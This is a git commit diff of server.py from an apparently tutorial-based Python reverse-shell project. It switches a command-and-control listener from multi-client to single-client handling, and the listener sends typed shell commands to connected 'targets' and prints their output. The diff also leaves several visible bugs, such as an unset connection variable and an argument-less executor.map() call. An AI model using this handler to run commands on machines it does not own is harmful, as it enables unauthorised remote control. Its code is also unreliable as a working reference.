cb80573fbbda8fb28df4c2f5c3c5fc6b0ec50f4e
FoxSinOfGreed1729 <70275323+FoxSinOfGreed1729@users.noreply.github.com>
2021-04-09 17:03:56 +0530

    Removed Multi Client Support
    The threading was glitching it up somehow, so it has single client support

--- server.py
+++ server.py
@@ -1,34 +1,37 @@
-#Written by FoxSinOfGreed1729
-#Many Thanks to TheNewBoston
+# Written by FoxSinOfGreed1729
+# Many Thanks to TheNewBoston
 import socket
-import sys
 import threading
 from queue import Queue
+import concurrent.futures
 
 no_of_threads = 2
-job_no = [1,2]
+job_no = [1, 2]
 queue = Queue()
 all_conn = []
-#this stored the connection object
+# this stored the connection object
 all_addr = []
-#this stores the IPs
 
-#Create a socket allowing us to connect to client
+
+# this stores the IPs
+
+# Create a socket allowing us to connect to client
 def socket_create():
     try:
         global host
         global port
         global s
-        host = '127.0.0.1'
-        #Host empty coz we're creating a server, the host will connect back
-        port = 9999
-        #Some Random port
+        host = 'localhost'
+        # Host empty coz we're creating a server, the host will connect back
+        port = 9991
+        # Some Random port
         s = socket.socket()
-        #Created the actual socket
+        # Created the actual socket
     except socket.error as msg:
         print('Error in socket creation' + str(msg))
 
-#now we'll bind the port info to the socket
+
+# now we'll bind the port info to the socket
 def socket_bind():
     flag = 0
     try:
@@ -38,43 +41,30 @@ def socket_bind():
         print('Binding socket to port ' + str(port))
         s.bind((host, port))
         s.listen(10)
-        #Number of bad connections it'll accept before stopping
+        # Number of bad connections it'll accept before stopping
     except socket.error as msg:
         print('Socket binding error ' + str(msg))
         print('Retrying......')
         if flag > 5:
             socket_bind()
 
-#Till now, We only listened for connections but now, we'll actually aceept the connetion
-#Establish a connection with client
-#Socket needs to be listening to accept connections
 
-#def socket_accept():
-#    conn, addr = s.accept()
-#    #This will wait untill connection has been Established
-#    print('Connection Established at IP ' + addr[0] + 'And Port ' + str(addr[1]))
-#    #Addr is info about the connections
-#    #Conn is a reference to the connection itself
-#    send_comand(conn)
-#    conn.close()
+# Till now, We only listened for connections but now, we'll actually accept the connection
+# Establish a connection with client
+# Socket needs to be listening to accept connections
 
-#this one's the multi handler
 def socket_accept():
-    for c in all_conn:
-        c.close()
-    del all_addr[:]
-    del all_conn[:]
-    while True:
-        try:
-            conn, addr = s.accept()
-            conn.setblocking(1)
-            all_conn.append(conn)
-            all_addr.append(addr)
-            print("Connection recieved from  "+all_addr[0])
-        except:
-            print("Error in recieving connection")
+    conn, addr = s.accept()
+    # This will wait until connection has been Established
+    print('Connection Established at IP ' + addr[0] + 'And Port ' + str(addr[1]))
+    # Addr is info about the connections
+    # Conn is a reference to the connection itself
+    all_conn.append(conn)
+    all_addr.append(addr[0])
+    print(all_addr)
 
-#function for interactive prompt
+
+# function for interactive prompt
 def prompt():
     while True:
         cmd = input('#')
@@ -82,26 +72,31 @@ def prompt():
             list_conn()
         elif 'select' in cmd:
             conn = get_tgt(cmd)
-            if conn is not None:
-                send_commands(conn)
+        elif cmd == 'connect':
+            send_command(conn)
         elif cmd == 'quit':
+            print('Closing all connections, preparing to quit ')
+            for conn_obj in all_conn:
+                conn_obj.close()
+                s.close()
             exit()
             quit()
         else:
             print('Command not recognized')
 
+
 def list_conn():
     results = ''
     for i, conn in enumerate(all_conn):
         try:
-            #testing for valid connections
+            # testing for valid connections
             conn.send(str.encode('   '))
             conn.recv(2048)
         except:
             del all_conn[i]
             del all_addr[i]
             continue
-        results += str(i) + '    ' + str(all_addr[i][0]) + '    ' + str(all_addr[i][1]) + '\n'
+        results += str(i) + '    ' + str(all_addr[i]) + '\n'
     print('-----Clients-------')
     print(results)
 
@@ -111,45 +106,49 @@ def get_tgt(cmd):
         target = cmd.replace('select ', '')
         target = int(target)
         conn = all_conn[target]
-        print("Target selected is    "+str(all_addr[target][0]))
+        print("Target selected is    " + str(all_addr[target]))
+        return conn
     except:
         print("something went wrong, please try again")
         return None
 
-#Function to send commands
-def send_comand(conn):
-    osname = str(conn.recv(1024), "utf-8")
-    print('OS is ' + osname)
-    print('Please give commands accordingly')
+
+# Function to send commands
+def send_command(conn):
     while True:
         try:
-            cmd = input()
+            wd = str(conn.recv(2048), "utf-8")
+            print(wd, end='')
+            cmd = input(">>>")
             if cmd == 'quit':
                 break
-                #A thing to remember is that stuff thats taken as input isn't bytes
-                #It's in byte type so we'll have to convert it to string manually
-                #Whenever we want to print it out to the user, it needs to be string
-                #Whenever we need to send it over the network, it needs to be bytes
-                #All stuff that comes fro the command line or the process itself is bytes
+                # A thing to remember is that stuff that's taken as input isn't bytes
+                # It's in byte type so we'll have to convert it to string manually
+                # Whenever we want to print it out to the user, it needs to be string
+                # Whenever we need to send it over the network, it needs to be bytes
+                # All stuff that comes fro the command line or the process itself is bytes
             if len(cmd) > 0:
                 conn.send(str.encode(cmd))
                 client_response = str(conn.recv(2048), "utf-8")
-                #2048 is the buffer size and utf is basic charachter encoding for a string
+                # 2048 is the buffer size and utf is basic character encoding for a string
                 print(client_response, end='')
-                #the end keyword is to not shift the cursor to a new line
+                # the end keyword is to not shift the cursor to a new line
         except:
             print("Something went wrong while remote command execution")
 
+
 def create_threads():
     for _ in range(no_of_threads):
-        t = threading.Thread(target = work)
+        t = threading.Thread(target=work)
         t.daemon = True
         t.start()
+
 
 def create_queue():
     for x in job_no:
         queue.put(x)
     queue.join()
+
 
 def work():
     while True:
@@ -162,5 +161,15 @@ def work():
             prompt()
         queue.task_done()
 
-create_threads()
-create_queue()
+
+def main():
+    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
+        executor.map()
+
+
+socket_create()
+socket_bind()
+socket_accept()
+prompt()
+
+# main()
